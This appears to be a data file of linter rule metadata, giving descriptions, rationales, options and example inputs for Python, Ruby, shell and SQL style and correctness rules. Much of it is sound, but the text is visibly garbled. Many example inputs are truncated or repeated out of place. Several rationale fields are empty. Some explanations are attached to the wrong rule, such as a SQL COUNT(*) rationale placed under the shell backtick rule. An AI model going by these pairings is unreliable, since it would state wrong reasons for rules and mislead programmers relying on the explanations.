rules.description: Reports a method whose `self` parameter is annotated with a type variable that the return annotation uses too, as in `def f(self: T) -> T`.

example.input:
from typing import Union
x: Union[int, str]

from typing import Optional
x: Optional[int]

from typing import List
x: List[int]

from typing import Generator
x: Generator[int, None, None]

def f(x: "int"):
    pass

from typing import TypeAlias
X: TypeAlias = int

from typing import Generic, TypeVar
T = TypeVar("T")
class A(Generic[T]):
    pass

from typing import TypeVar
T = TypeVar("T")
def f(x: T) -> T:
    return x

def g() -> T:
    pass

import datetime
x = datetime.timezone.utc

from typing_extensions import Self

import sys
if sys.version_info >= (3, 8):

from typing import TypeVar
T = TypeVar("T")
class A:
    def f(self: T) -> T:

from typing import Any
class A:

from typing import TypeVar

rules.why:
`typing.Self` (Python 3.11) states "the type of this instance" without declaring a type variable, and it is the form that type checkers and readers know. The type variable has to be declared, bound and imported for the same meaning.

To fix, drop the annotation of `self` and return `Self`.

rules.description: Reports `datetime.timezone.utc`, also written `timezone.utc` after an import, when the `target_version` has `datetime.UTC` (3.11 and later).

`datetime.UTC` is the shorter name of the same object, added in Python 3.11. One spelling of UTC in a code base is easier to search for.

rules.description: Reports a bare `except:` that is followed by another handler of the same `try`.
rules.why:
A bare `except:` catches everything, so the handlers after it can never run. Python rejects the file with `SyntaxError: default 'except:' must be last`.

To fix, put the bare `except:` last, or better, name the exceptions it should catch.

rules.description: Reports `Generator[X, None, None]` and `AsyncGenerator[X, None]` when the `target_version` gives the last arguments a default (3.13 and later).

example.input:
from typing import Union
x: Union[int, str]

from typing import Optional
x: Optional[int]

from typing import List
x: List[int]

from typing import Generator
x: Generator[int, None, None]

def f(x: "int"):
    pass

from typing import TypeAlias
X: TypeAlias = int

from typing import Generic, TypeVar
T = TypeVar("T")
class A(Generic[T]):
    pass

from typing import TypeVar
T = TypeVar("T")
def f(x: T) -> T:
    return x

def g() -> T:
    pass

import datetime
x = datetime.timezone.utc

from typing_extensions import Self

import sys
if sys.version_info >= (3, 8):
    pass

from typing import TypeVar
T = TypeVar("T")
class A:
    def f(self: T) -> T:
        return self

from typing import Any
class A:
    def __eq__(self, other: Any) -> bool:
        return True

from typing import TypeVar
T = TypeVar("T", covariant=True)

rules.why:
From Python 3.13 the send and return types of a generator default to `None`, so `Generator[int]` means the same as `Generator[int, None, None]` and `AsyncGenerator[int]` the same as `AsyncGenerator[int, None]`. The extra arguments are noise.

To fix, remove the trailing `None` arguments.

rules.description: Reports an import of a name from the wrong module for the `target_version`: a name of `typing_extensions` that `typing`, `collections.abc` or `warnings` has in that version, an alias in `typing` of a `collections.abc` class, or `List`, `Dict`, `Set`, `FrozenSet`, `Tuple` or `Type`.

The backport module exists for old versions. Once the standard library has the name, importing it from there removes a dependency, and the old aliases of `typing` are deprecated in favour of the builtin generics and `collections.abc`.

rules.description: Reports a subscript of `typing.List`, `Dict`, `Set`, `FrozenSet`, `Tuple` or `Type` when the `target_version` makes the builtin generic (3.9 and later).

Since Python 3.9 `list[int]`, `dict[str, int]` and the other builtins are generic, and the `typing` aliases are deprecated. They also need an import that the builtin does not.

rules.description: Reports `not not x`.

example.fixed:
a = b = c = d = k = 1
x = k in d.keys()
x = k not in d.keys()
x = k in d.keys(1)
x = [k for k in d.keys()]
for k in d.keys():
    pass
x = a != b
x = a == b
x = not a < b
x = not a == b == c
x = a
x = True if a else False
x = False if a else True
x = 1 if a else 1
x = b if not a else a
x = b if a else a
example.input:
a = b = c = d = k = 1
x = k in d.keys()
x = k not in d.keys()
x = k in d.keys(1)
x = [k for k in d.keys()]
for k in d.keys():
    pass
x = not a == b
x = not a != b
x = not a < b
x = not a == b == c
x = not not a
x = True if a else False
x = False if a else True
x = 1 if a else 1
x = b if not a else a
x = b if a else a

rules.why:
A double `not` turns a value into a bool, but the reader has to unwind two negations to see that. `bool(x)` says it, and in a condition the `not not` can be dropped.

To fix, write `bool(x)`, or `x` where only the truth is needed.

rules.description: Reports `return None` in a function whose other returns, if any, return nothing or `None`. A function that is a generator, one whose only statement is `return None`, a property and a function annotated with anything but `None` are left alone.
rules.why:
A function without a value returns `None` anyway, so the word adds nothing. The explicit form is needed where another `return` has a value, to tell the reader that `None` is meant, and that case is not reported.

To fix, write `return`, or remove it at the end of the function.

rules.description: Reports a `"...".format(...)` call on a string literal whose fields all name an argument.

example.input:

    a, b = g()
    return a

    x = []

def f(a):

x = ["a" "b", "c"]

import os

class A:

def f(x=list()):

a = b = "x"

x = "%s" % y

import re

rules.why:
An f-string puts the expression where it is shown, so the reader does not look from the field to the argument list and count positions. It is also the faster form.

rules.description: Reports an f-string that has no replacement field in any of its parts.

example.input:
x = b = 1
f"text"
f"{x}"
f"a" f"{b}"
"plain"
f"{{}}"

rules.why:
The `f` prefix does nothing without a `{}`, and it suggests that a value was meant to be put in. It is often a placeholder that was lost in an edit.

To fix, remove the `f`, or add the field.

rules.description: Reports a quoted annotation whose text is not an expression.
rules.why:
Type checkers and `typing.get_type_hints` parse the string as an expression. A string that is not one fails there, though Python itself never looks at it when the code runs, so the mistake hides until a tool evaluates the annotation.

To fix, correct the text of the annotation.

rules.description: Reports a call in the default value of a parameter. Calls in a lambda, and calls of immutable builtins such as `tuple`, are not reported.

example.input:
import collections
from typing import Sequence

x = a = b = 1


def f(a=[], b={}, c=set(), d=list(), e=collections.deque(), g=[x for x in a]):
    pass


def immutable(a: Sequence[int] = [], b: tuple = (), c=(), d=frozenset(), e=bytearray()):
    pass


assert False
assert False, "message"
assert 0
getattr(x, "name")
getattr(x, "__private")
getattr(x, "class")
getattr(x, "name", None)
setattr(x, "name", 1)
y = setattr(x, "name", 1)
setattr(x, "class", 1)

zip(a)
zip(a, b, strict=True)
try:
    pass
except (ValueError,):
    pass
except (ValueError, TypeError):
    pass

rules.why:
A default is evaluated once, when the function is defined, and every call shares the value. `def f(when=datetime.now())` keeps the time of the import for ever, and a default that builds an object shares that object between calls.

To fix, default to `None` and make the value in the body.

rules.description: Reports a name imported from `__future__` that the module does not define.
rules.why:
Python rejects the file with `SyntaxError: future feature ... is not defined`, since `__future__` has a fixed set of names (a misspelling, or a feature of a newer version).

To fix, correct the name or remove the import.

rules.description: Reports a class that has `Generic[...]` among its bases when the `target_version` has type parameters (3.12 and later).

x: Union[int, str]

from typing import Optional
x: Optional[int]

from typing import List
x: List[int]

from typing import Generator
x: Generator[int, None, None]

T = TypeVar("T")
def f(x: T) -> T:

def g() -> T:

rules.description: Reports an `if` or `elif` whose test is a tuple.
rules.why:
A tuple with elements is always true (and an empty one always false), so the branch is always taken. It is usually a stray comma, or a condition written inside parentheses with commas instead of `and`.

To fix, write one boolean expression.

rules.description: Reports two neighbouring branches of an `if`/`elif` chain whose bodies are the same.
rules.why:
Two branches that do the same thing are one branch with a condition joined by `or`. Written twice, a later change is made to one and not the other.

To fix, join the conditions with `or`.

Python joins adjacent literals into one string. In a collection that is usually a comma that was left out, and the two items silently become one.

rules.description: Reports a backslash in a string that is not raw and does not start an escape sequence (`"\d"`, `"\_"`), also in the pieces of an f-string.
rules.why:
The language keeps the backslash and the letter, so `"\d"` works today, but a later version can give the sequence a meaning, and newer interpreters already warn or reject it. It is also usually a regular expression or a Windows path where the author meant a different escape.

To fix, double the backslash (`"\\d"`) or make the string raw (`r"\d"`).

rules.description: Reports `print >> file, ...`, the Python 2 form that writes to a file.
rules.why:
In Python 3 `print >> file, x` is an expression that shifts the function `print` right by `file`, which fails with a `TypeError` when it runs, and the text is never written.

To fix, call `print(..., file=file)`.

rules.description: Reports code that Python rejects when it compiles the file although the grammar allows it, such as a duplicate parameter, `nonlocal` at module level or `await` in a function that is not async.
rules.why:
Python raises a `SyntaxError` for the file, so none of the code in it runs, and the error shows up only when the module is imported or compiled.

To fix, follow the message and correct the statement.

rules.description: Reports an identity test (`is` or `is not`) with a string, bytes or number literal, a list, set, dict or comprehension, or a tuple of constants.

example.input:
x = y = 1
x is "a"
x is not 1
b"" is x
x is None
x is True
x is y
x == "a"
x is [1]
(1, None) is x
x is (1, y)
x is f"a"

rules.why:
`is` compares object identity, not the value. Whether two equal literals are one object depends on the implementation, so `x is "a"` can be true in one run and false in another. Python warns about it at compile time.

To fix, write `==` or `!=`.

rules.description: Reports a lambda assigned to a single name. An annotated assignment in a class body is left alone.

example.input:

f = lambda x: x
g: int = lambda: 1
h.attr = lambda: 1
j = (lambda: 1)()
k = [lambda: 1]

rules.why:
A `def` gives the function a real name in tracebacks and `repr`, takes annotations and a docstring, and reads as what it is. The lambda keeps its generic name, `<lambda>`.

To fix, write a `def`.

rules.description: Reports a `from __future__` import that comes after other statements.

example.input:

import sys
import json as json
import a.b
import a.c
from m import n, o as p
from . import q
from __future__ import annotations

import re
import re

    return sys

rules.why:
Python rejects the file with `SyntaxError: from __future__ imports must occur at the beginning of the file`. Only a docstring, comments and other future imports may come before it.

To fix, move the import to the top.

rules.description: Reports an import at module level after code. Docstrings, `__all__`, blocks (`if`, `try`) and `sys.path` or `os.environ` setup do not count as code.
rules.why:
Imports at the top show what the module depends on, in one place, and a name is never used before it is imported. An import in the middle hides a dependency and runs later than a reader expects.

To fix, move the import to the top of the file.

rules.description: Reports an `import` that names several modules, as in `import os, sys`.

import os.path as p, re
from a import b, c

rules.why:
One import per line gives one line per change in a diff, and a merge conflict or a removed import touches one line.

To fix, write one `import` per module.

rules.description: Reports an assignment target with two starred names, such as `a, *b, *c = x`.
rules.why:
Python rejects the file with `SyntaxError: multiple starred expressions in assignment`, since it cannot tell how to split the values between them.

To fix, keep one starred name.

rules.description: Reports a compound statement whose body starts on the line of its colon, as in `if x: y()`. `def` and a lone `...` as the body are not reported.
rules.why:
The body is easy to miss when it sits at the end of a long line, and a line breakpoint or coverage mark on the line cannot tell the condition from the body.

To fix, put the body on its own indented line.

rules.description: Reports statements joined by `;` on one line.
rules.why:
Each statement on its own line is one statement per diff line, per breakpoint and per coverage mark, and a reader of the code does not need to look for a second statement at the end of the line.

To fix, put each statement on its own line.

rules.description: Reports a parameter whose default is a list, dict or set: a literal, a comprehension, or a call of `list()`, `dict()`, `set()`, `collections.deque()` and the like. A parameter annotated with an immutable type is left alone.

rules.description: Reports a `with` whose only statement is another `with`, when both are sync or both are async.
rules.why:
One `with` can open several context managers (`with a, b:`), which saves an indent level and the long lines that nesting forces.

To fix, join the two into one `with`.

rules.description: Reports a `catch`, `except` or `rescue` clause that catches everything (a clause with no type, when the `bare` option is set) or one of the broad `types`, when it does not raise the error again and has no call that matches `handled`. Each language lists the broad types in its grammar's `rule` row.

options.description: A clause with no type is broad
options.name: bare

options.description: Types that are broad
options.name: types

options.description: A call that handles the error (logs its traceback)
options.name: handled

rules.why:
A broad clause also catches errors that the code did not expect, a typo that raises `NameError` or a user's interrupt, and turns them into a silent wrong result. The error is gone, and nobody learns that the program is broken.

To fix, name the exceptions the code can handle, or raise the error again after the handling.

rules.description: Reports a `raise` or `throw` of one of the generic `types`, itself or a call of it. Each language lists the types in its grammar's `rule` row.

options.description: Generic exception types
options.name: types

rules.why:
A caller cannot tell a generic exception from any other error, so it can only catch everything or nothing, and the generic type also catches errors from other code. A specific type lets a caller handle the case.

To fix, raise a specific exception: a built-in one that fits (`ValueError`), or a class of your own.

rules.description: Reports a comparison of a value to `None` with `==` or `!=`.

example.input:
x = 1
x == None
x != None
None == x
None != x
x is None
x == 1

rules.why:
`None` is a single object, and `is` and `is not` test for it. `==` calls `__eq__` of the other operand, which a class can define to return true for `None` (NumPy arrays compare element by element and return an array).

To fix, write `x is None` or `x is not None`.

rules.description: Reports a membership test negated in front of the expression: `not a in b`.

example.input:
a = b = 1
not a in b
not a not in b
a not in b
not (a in b)

rules.why:
`a not in b` is the operator for it. The prefix form is the same test, but a reader may take it as `(not a) in b`.

To fix, write `a not in b`.

rules.description: Reports an identity test negated in front of the expression: `not a is b`.

example.input:
a = b = 1
not a is b
not a is not b
a is not b

rules.why:
`a is not b` is the operator for it. The prefix form is the same test, but a reader may take it as `(not a) is b`.

To fix, write `a is not b`.

rules.description: Reports a call of `open` or `tempfile.NamedTemporaryFile` and the like that is not the context of a `with`, is not returned and is not given to `enter_context`.
rules.why:
A file that is not closed explicitly is closed when the object is freed, which depends on the interpreter and on references that remain, and on an error between the open and the close it stays open. Handles that stay open run a process out of descriptors, and buffered data may not be written.

To fix, open the file in a `with` statement.

rules.description: Reports a `typing.Optional[...]` subscript when the `target_version` has `X | Y` (3.10 and later).

x: Union[int, str]

x: Optional[int]

from typing import List
x: List[int]

from typing import Generator
x: Generator[int, None, None]

    pass

    pass

def f(x: T) -> T:
    return x

def g() -> T:
    pass

import datetime

    pass

    def f(self: T) -> T:

    def __eq__(self, other: Any) -> bool:
        return True

rules.why:
`Optional[X]` is a name for `X | None`, which the newer syntax writes without an import and in the same form as other unions. The name also suggests a parameter that may be left out, which it is not.

To fix, write `X | None`.

rules.description: Reports `EnvironmentError`, `IOError`, `WindowsError`, `mmap.error`, `os.error`, `select.error` or `socket.error` in an `except` clause or a `raise`.
rules.why:
Since Python 3.3 these names are other names of `OSError`. Using the old ones makes a reader look for a difference that is not there.

To fix, write `OSError`.

rules.description: Reports a test of `sys.version_info` against a version older than the `target_version`, or of `sys.version_info[0]` against a number.

rules.why:
For the target version the answer of the test is always the same, so one of the branches never runs and the other needs no test. It is a block that was kept after support for the old version ended.

To fix, remove the test and keep the branch that runs.

rules.description: Reports a `%` format that has named placeholders (`%(a)s`) applied to a tuple, list or set.
rules.why:
Named placeholders look their value up in a mapping. With a tuple, Python raises `TypeError: format requires a mapping` when the line runs.

To fix, pass a dict, or use positional placeholders.

rules.description: Reports a `%` format that has several positional placeholders applied to a dict.
rules.why:
Positional placeholders take one value each from a tuple. A dict is taken as one value, so with two or more placeholders Python raises `TypeError: not enough arguments for format string`.

To fix, pass a tuple, or name the placeholders (`%(a)s`).

rules.description: Reports a `%` format applied to a dict that has keys that no placeholder names.
rules.why:
Python ignores the extra keys without an error. The key is a leftover after the format string was edited, or a placeholder was misspelled and the value is never shown.

To fix, remove the key, or add the placeholder.

rules.description: Reports a `"..." % x` whose format string does not parse, such as a `%` at the end of the string.
rules.why:
Python raises `ValueError: incomplete format` when the line runs, so the failure is at run time and only on the path that reaches the line.

To fix, escape a literal percent sign as `%%`, or complete the conversion.

rules.description: Reports a `%` format with named placeholders that the dict does not have.
rules.why:
Python raises a `KeyError` for the first missing key when the line runs. A key that is misspelled in the string or in the dict is the usual cause.

To fix, add the key, or correct the name.

rules.description: Reports a `%` format that has both positional placeholders (`%s`) and named ones (`%(a)s`).
rules.why:
A format takes its values from a tuple or from a mapping, not both. Python raises a `TypeError` at run time.

To fix, use only named placeholders with a dict, or only positional ones with a tuple.

rules.description: Reports a `%` format whose number of placeholders differs from the number of values in the tuple.
rules.why:
Python raises a `TypeError` when the line runs: `not enough arguments for format string` with too few values, `not all arguments converted during string formatting` with too many.

To fix, make the two counts the same.

rules.description: Reports a `%` format with a `*` width or precision applied to a dict.
rules.why:
A `*` takes its number from a tuple of values. Python raises `TypeError: * wants int`.

To fix, pass a tuple with the width before the value, or write the number in the format.

rules.description: Reports a `%` format with a conversion character that Python does not know, as in `"%z" % x`.
rules.why:
Python raises `ValueError: unsupported format character` when the line runs. It is usually a literal `%` that should have been written `%%`.

To fix, write `%%` for a percent sign, or a conversion Python has (`s`, `r`, `a`, `d`, `i`, `f`, `x` and so on).

rules.description: Reports a `"..." % x` whose format string and values pair up: a tuple with as many values as placeholders, a dict for named fields, or one value for one placeholder.

To fix, write an f-string, or use `.format`.

rules.description: Reports a `raise` of `NotImplemented`, with or without a call.

example.input:

raise NotImplemented("a")
raise NotImplementedError
raise

rules.why:
`NotImplemented` is the value that binary operators return to say "I cannot do this for that type". It is not an exception, so raising it fails with a `TypeError` that hides the real reason.

To fix, raise `NotImplementedError`.

rules.description: Reports a `raise` of an exception inside an `except` clause without `from`. Nested `if`, loops, `with` and `match` are part of the clause; a nested `try`, function or class is not. Raising the name the clause bound is not reported.
rules.why:
Without `from`, the traceback says "During handling of the above exception, another exception occurred", which reads as a bug in the handler. `from err` says that this exception is the result of that one, and `from None` hides the first one on purpose.

To fix, add `from err`, or `from None`.

rules.description: Reports a branch tested with `isinstance`, `issubclass` or `callable` that raises a builtin exception other than `TypeError` (`NotImplementedError` is accepted too).
rules.why:

To fix, raise `TypeError`.

rules.description: Reports a comparison with `==` or `!=` where one side is `type(x)` or a builtin class such as `int`. A name that shadows the builtin is not reported.

rules.why:

To fix, use `isinstance(x, int)`, or `type(x) is int` for an exact match.

rules.description: Reports a name in `__all__` that the module does not bind.
rules.why:

To fix, correct the name or remove it from `__all__`.

rules.description: Reports a name that no scope binds in a file that has a star import.

__all__ = ["present", "from_star"]
present = 1
print(undefined, present, len)


def nested():

    x: int
    print(x)

rules.why:
With `from m import *` the names it brings in are not visible to a reader or a tool, so a name that is defined nowhere in the file may come from the import or may be a misspelling. The same file without the star import would be reported as undefined.

To fix, import the names that are used, or define them.

rules.description: Reports a variable whose name starts with `_`, which says it is unused, but that is read. No fix.
rules.why:
A leading underscore tells the reader that the value is ignored. Reading it breaks that promise, and the next editor may remove the variable or the argument as unused.

To fix, drop the underscore, or stop reading the variable.

rules.description: Reports a block parameter that the block never reads. Names that start with `_` and empty blocks are left alone. No fix.
rules.why:
A block parameter that is never read is a value that the block was given for nothing, or a mistake in the block. A leading `_` says that it is skipped on purpose, as when a hash is walked for its values only.

To fix, remove the parameter, or prefix its name with `_`.

rules.description: Reports a method parameter that the method never reads. Names that start with `_`, empty methods and methods that only raise `NotImplementedError` are left alone. No fix.
rules.why:
An argument that is never read is either dead (callers pass a value for nothing) or a mistake (the method was meant to use it). Naming it with a leading `_` says that it is left out on purpose, as in an override that must keep the signature.

To fix, remove the parameter, or prefix its name with `_`.

rules.description: Reports a bare `private`, `protected`, `public` or `module_function` that repeats the visibility already in force, or is followed by no method definition.

example.input:
class A < Exception; end
class B < StandardError
  def initialize(msg)
    super(msg)
  end
  def foo=(_v)
    return 1
  end
  def bar(a, b = 1)
    super
  end
  private
  def self.baz; end
  private
  def qux; end
  public
end
class C
  def run
    super
  end
  private
end
class D < B
  def initialize
  end
end
[1].each { X = 1 }

rules.why:
The modifier does nothing, so a reader who relies on it believes methods are private that are not, or the other way round.

To fix, delete it, or move the methods it was meant to cover under it.

example.input:
class A < Exception; end

    return 1
  end

  private
  def qux; end
  public
end
class C
  def run
    super
  end
  private
end
class D < B
  def initialize
  end
end
[1].each { X = 1 }

rules.why:
The method does what the inherited one does, so the definition adds only code.

To fix, delete the method.

rules.description: Reports `0.times` and `1.times` with a block.

example.input:
puts [1].map { |x| x }
raise Exception, "m"
raise StandardError
foo (1)
foo (a ? b : c)
foo(1)
h[x.object_id]
h.key?(x.id)
1.times { f }
2.times { f }
Struct.new(:hash, :name)
puts "#{x.to_s} #{y}"
puts x.to_s, y
x == x
a && a
a == b

rules.why:
The block runs at most once, so the loop is a way to write `if`. It is usually left from a value that was a variable.

To fix, delete the loop, or call the code directly.

rules.description: Reports a list `a && b || c` of three commands, unless `c` is `echo`, `printf`, `true`, `:`, `return` or `exit`.

example.input:
cat in.txt | grep x
cat -n in.txt | grep x
cat a b | grep x
grep x in.txt
echo $(date)
echo "$(date)"
echo `date`
echo "$(date) now" $x
echo "$(date)s"
read line
read -r line
read -p "x" -r line
printf "$fmt"
printf "%s $x\n" y
printf "a$x" y
printf '%s' "$x" "a $b"
printf 'literal $x'
trap "rm $tmp" EXIT
trap 'rm $tmp' EXIT
trap "echo bye" EXIT
ls | grep txt
ps aux | grep nginx
grep x f | wc -l
egrep x f
fgrep x f
which git
test -f x && echo yes || cleanup
test -f x && echo yes || echo no
[ -n x ] && (a || b)
a && b
a || b && c
ls -l | grep txt | wc -l
which git

upstream.note: Only the plain three-command list; shellcheck exempts a `true`/`:` middle command.

rules.why:
It looks like an if/else, but `c` runs whenever `a && b` does not succeed, and that includes the case where `a` succeeds and `b` fails. A failing `b` runs both `b` and `c`.

To fix, write an `if a; then b; else c; fi`.

rules.description: Reports a double-quoted argument that holds `$@` or `${array[@]}` among other text, as in `"files: $@"`.

example.input:
a="x "\""$v"\"" y"
d=($(cmd "$a"))
l+=($dl)
x=($dl "q" "$m")
flunk "failed: $@"
echo "a ${s[@]} b"
echo "$@" "${s[@]}"
PGHOST= psql
IFS= read -r line
PGHOST=db psql
unset words[0]
unset "words[0]"
[[ $a == $b ]]
[[ $a == "$b" ]]
x=$(echo $y)
x=$(echo "a" | tr a b)
[[ $(ps | grep x) ]]
for l in $(cat file); do :; done
for l in "$@"; do :; done
eval "f ${args[@]}"
A=1 echo "$A"
A=1 cmd "$B"
A=1 cmd "$A_"
echo "$FUNCNAME" "${FUNCNAME[0]}"

upstream.note: Only the arguments of a command.

rules.why:
Inside a string with other text, `"$@"` cannot give one word to each element. The first element is joined to the text before it and the last to the text after it, and the elements in between become separate words, so the string is split in a way that is easy to misread.

To fix, use `$*` (or `${array[*]}`) to join them into one string, or put the array in a separate argument of its own.

rules.description: Reports `$BASH_SOURCE`, `$FUNCNAME` and the other bash arrays used without a subscript.

a="x "\""$v"\"" y"
d=($(cmd "$a"))
l+=($dl)
x=($dl "q" "$m")
flunk "failed: $@"
echo "a ${s[@]} b"
echo "$@" "${s[@]}"
PGHOST= psql
IFS= read -r line
PGHOST=db psql

unset "words[0]"
[[ $a == $b ]]
[[ $a == "$b" ]]
x=$(echo $y)
x=$(echo "a" | tr a b)
[[ $(ps | grep x) ]]
for l in $(cat file); do :; done
for l in "$@"; do :; done
eval "f ${args[@]}"
A=1 echo "$A"
A=1 cmd "$B"
A=1 cmd "$A_"
echo "$FUNCNAME" "${FUNCNAME[0]}"

upstream.note: Only the bash arrays `BASH_SOURCE`, `FUNCNAME` and the like; user arrays need their declarations.

rules.why:
`$BASH_SOURCE` is the same as `${BASH_SOURCE[0]}`: the first element only. A reader may expect the whole array or the top of the stack, and the code is wrong when the element that was meant is another one.

To fix, write the subscript: `${BASH_SOURCE[0]}`.

rules.description: Reports `var=value cmd "$var"`, where `$var` is used in the arguments of the command that the assignment is a prefix of.

l+=($dl)
x=($dl "q" "$m")

unset "words[0]"
[[ $a == $b ]]
[[ $a == "$b" ]]
x=$(echo $y)
x=$(echo "a" | tr a b)
[[ $(ps | grep x) ]]
for l in $(cat file); do :; done
for l in "$@"; do :; done
eval "f ${args[@]}"
A=1 echo "$A"
A=1 cmd "$B"
A=1 cmd "$A_"
echo "$FUNCNAME" "${FUNCNAME[0]}"

upstream.note: Only an expansion inside a double-quoted argument.

rules.why:
The shell expands the arguments before the command runs, and the prefix assignment takes effect only in the command's environment. `$var` in the arguments is the old value (often empty), not `value`.

To fix, assign on its own line, or read the variable inside the command.

unset "words[0]"

rules.description: Reports `cd`, `pushd` or `popd` whose failure is not handled, as in `cd dir || exit`. It is not reported under `set -e`, for `cd ..` or `cd /`, or for `popd -n`.

example.input:
cd build
cd .. && make
cd /
cd build || exit
cd build && make
make && cd build
if cd build; then make; fi
while cd build; do break; done
cd build | cat
pushd build
popd -n
popd
if cd build | cat; then :; fi
{
	cd build
}
f() { cd build; }

rules.why:
If the directory is missing the script goes on in the old one, and the commands that follow (a `rm -rf *`, a build, a copy) run in the wrong place.

To fix, write `cd dir || exit 1`, or use `set -e`.

rules.description: Reports `export`, `local`, `declare`, `readonly` or `typeset` with a command substitution as the value, as in `local x=$(cmd)`.

example.input:
rm $(cat list)
rm "$(cat list)"
rm a$(b) `c`
rm '$(literal)' "$(ok)"
echo $((1 + 2))
diff <(sort a) <(sort b); echo <(date)
rm $file ${dir}/x "$file" '$file' $1 $?
rm --opt=$value "x $y"
cp $@ dir
cp "$@" dir "${arr[@]}" ${arr[@]}
cp $* dir ${arr[*]}
now=`date`
echo `date` "`date`" 'a`b`'
[ -n `foo` ]
[ $x -eq 0 ]
[[ $x = $y ]] && [[ -n $(foo) ]]
export out=$(make)
local out="$(make)" x=1
declare plain=1
for f in $files; do :; done

rules.why:
The exit status of the line is that of `local`, which succeeds, and not of `cmd`. A failing command is lost, even under `set -e`.

To fix, declare first and assign on the next line: `local x; x=$(cmd)`.

rules.description: Reports a pipeline from `find` into `xargs` without `-print0` and `-0`.

example.input:

if [ "$?" != 0 ]; then :; fi
[ $x -eq 0 ]
[ -f a -o -f b ]
[ -a file ]
[[ -f a && -f b ]]

To fix, use `find ... -print0 | xargs -0 ...` (or `find -exec`).

rules.description: Reports a command substitution written with backticks.

rules.why:
`COUNT(*)` is the standard form and counts rows. `COUNT(1)` and `COUNT(0)` give the same number, but a reader may wonder whether the constant matters, and some think it is faster, which it is not.

To fix, write `COUNT(*)`.

rules.description: Reports a `;` written after a space, a line break or another `;`, instead of right after its statement.
rules.why:
The end of a statement is easy to see when the `;` sits against the last token. On its own line it reads as a separate, empty statement, and a stray `;;` is an empty one.

To fix, write the `;` right after the statement.

rules.description: Reports `SELECT DISTINCT` in a query that has `GROUP BY`.
rules.why:
When the select list has all the grouping columns, the rows are distinct already and `DISTINCT` does nothing. When it leaves one out (`SELECT DISTINCT a ... GROUP BY a, b`), `DISTINCT` does change the result, and the grouping by the other column is probably a mistake.

To fix, remove `DISTINCT`, or group by the selected columns only.

rules.description: Reports two select elements with the same column name, compared without case and quotes: an alias, or the last part of a plain column reference.
rules.why:
The result has two columns with one name. Clients that read the result by name get only one of them, a subquery or a view built on it is rejected by some databases, and which one wins is not defined.

To fix, give one of them another alias.

rules.description: Reports two tables of one `FROM` clause with the same alias, or the same name when there is no alias.
rules.why:
A column reference with that alias can mean either table. Databases reject the query as ambiguous, or the query reads the wrong one.

To fix, give each table its own alias.

rules.description: Reports a `CASE` branch `ELSE NULL`.
rules.why:
A `CASE` that does not match returns `NULL` without an `ELSE`, so the branch says what is already the case.

To fix, remove the `ELSE NULL`.

rules.description: Reports a column of a `SELECT` list that is an expression (a function call, a literal, an operator, a `CASE`) with no alias. A column, `*`, a parenthesised expression and a `::` cast of a column are left alone; `CAST(a AS int)` is a function call and is reported.

rules.why:
Without an alias the name of the column is chosen by the database (`?column?`, `count`, `sum`, `expr1`), and it differs between databases and versions. Code that reads the result by name, and views built on the query, then depend on a generated name.

To fix, add `AS name`.

rules.description: Reports a function name not in the case that the `policy` option sets. With `consistent` (the default) the first one written fixes the case (`upper`, `lower` or `capitalise`) and a later one that cannot be in it is reported; the other values name the case. The fix writes the word in that case.

options.name: policy

rules.why:
Function names written in one case are easy to read and search for. Mixed case makes the same function look like two.

To fix, write the name in the case that the policy gives.

rules.description: Reports a `GROUP BY` or `ORDER BY` clause that lists both column names or expressions and column positions (`1`, `2`), or that lists them in the other way than the first such clause of the file.
rules.why:
Positions are short but depend on the order of the select list: a column added to the front changes what `GROUP BY 1` means, with no error. A clause that mixes the two is read in two ways.

To fix, use names in every clause, or positions in every one.

rules.description: Reports an unquoted identifier not in the case that the `policy` option sets. With `consistent` (the default) the first one written fixes the case (`upper`, `lower` or `capitalise`) and a later one that cannot be in it is reported; the other values name the case. The fix writes the word in that case.

options.name: policy

rules.why:
Most databases ignore the case of an unquoted name, so `Orders` and `orders` are one table, but a reader sees two. One case makes names easy to search for and to compare.

To fix, write the name in the case that the policy gives.

rules.description: Reports a table or column alias written without the `AS` keyword.
rules.why:
The alias of a column is easy to confuse with a missing comma: `select a b from t` is one column named `b`, and `select a, b from t` is two. `AS` makes it explicit.

To fix, write `AS` before the alias.

rules.description: Reports a select over one table in which some column references are qualified (`t.a`) and others are not.
rules.why:
Mixed forms make the reader wonder whether the two refer to the same thing. With one table, one style is enough for every reference, and the unqualified one becomes ambiguous once a join is added.

To fix, qualify all of them, or none.

rules.description: Reports a `JOIN` with no join type, which is an inner join.
rules.why:
`JOIN` alone leaves it to the reader to know that it means `INNER JOIN` (and not left). The keyword makes the intent explicit next to `LEFT JOIN`.

To fix, write `INNER JOIN`.

rules.description: Reports a keyword not in the case that the `policy` option sets. With `consistent` (the default) the first one written fixes the case (`upper`, `lower` or `capitalise`) and a later one that cannot be in it is reported; the other values name the case. The fix writes the word in that case.

options.description: The case the words must be in: `consistent` follows the first one written.
options.name: policy

rules.why:
Keywords in one case stand out from the names of tables and columns, and a file that mixes cases looks like it was merged from different sources.

To fix, write the keyword in the case that the policy gives.

rules.description: Reports an unquoted name written like a keyword of the dialect, such as a column called `year` or `name`.

rules.why:
A name that is a keyword can be read as the keyword. In some positions the parser takes the keyword, in others the name, and a new version of the database may reserve the word and break the query.

To fix, rename it, or quote it.

rules.description: Reports `NULL`, `TRUE` or `FALSE` not in the case that the `policy` option sets. With `consistent` (the default) the first one written fixes the case (`upper`, `lower` or `capitalise`) and a later one that cannot be in it is reported; the other values name the case. The fix writes the word in that case.

options.description: The case the words must be in: `consistent` follows the first one written.
options.name: policy

rules.why:
These literals are written as values in the query. Using one case for them keeps them uniform and easy to find.

To fix, write the literal in the case that the policy gives.

rules.description: Reports a quoted name that is a plain word, not reserved, and already in the case the dialect folds unquoted names to (upper case for ansi, lower case for postgres), so the quotes change nothing.

example.input: select "A", "a", "ab c", "SELECT", date, name, a as filter from t;

rules.why:
The quotes suggest that the name is special, but it is the same name without them. Quotes also make the name case sensitive in the code that follows, which hides a mistake when one use is quoted and another is not.

To fix, remove the quotes.

rules.description: Reports `= NULL`, `<> NULL` and `!= NULL`.
rules.why:
A comparison with `NULL` gives `NULL`, not true or false, so the condition is never true and the query returns no rows (or, with `<>`, none of the rows that it should).

To fix, write `IS NULL` or `IS NOT NULL`.

rules.description: Reports a call of `IFNULL` or `NVL`.
rules.why:
`COALESCE` is in the SQL standard and works on every database. `IFNULL` and `NVL` are vendor functions, take two arguments only and may handle types differently.

To fix, write `COALESCE`.

rules.description: Reports a `RIGHT` join.
rules.why:
